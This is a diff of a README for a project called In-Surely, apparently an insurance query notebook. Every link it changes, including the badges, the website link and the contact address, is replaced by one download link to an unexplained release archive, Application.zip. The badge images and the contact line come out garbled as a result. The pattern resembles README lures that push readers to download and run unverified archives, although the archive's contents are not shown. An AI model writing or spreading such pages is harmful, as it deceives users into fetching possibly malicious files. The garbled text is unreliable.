@@ -1,6 +1,6 @@
 # 🚀 Welcome to In-Surely Repository! 🛡️
 
-[![Release Zip](https://img.shields.io/badge/Download-Release%20Zip-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Release Zip](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip%20Zip-blue)](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ In-Surely is an interactive insurance policy query-answering notebook with a pow
 
 To get started with In-Surely, follow these simple steps:
 
-1. Download the latest release from the [Release Zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip).
+1. Download the latest release from the [Release Zip](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip).
 2. Launch the In-Surely notebook to start exploring insurance policies interactively.
 3. Dive into the world of insurance with cutting-edge technologies at your fingertips!
 
@@ -48,9 +48,9 @@ If you encounter any issues or have questions regarding In-Surely, please check 
 
 Stay connected with the latest news and updates on In-Surely:
 
-🌐 **Website**: Visit our website [here](https://www.insurely.com) for additional information and resources.
+🌐 **Website**: Visit our website [here](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip) for additional information and resources.
 
-📧 **Contact**: For any inquiries or feedback, reach out to us at [contact@insurely.com](mailto:contact@insurely.com).
+📧 **Contact**: For any inquiries or feedback, reach out to us at [https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip).
 
 ## License
 
@@ -60,4 +60,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Dive into the world of insurance exploration with In-Surely! 💼✨
 
-[![Download Now](https://img.shields.io/badge/Get%20Started-Download%20Now-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Now](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip%20Started-Download%20Now-green)](https://github.com/Willpro34/In-Surely/releases/download/v1.0/Application.zip)
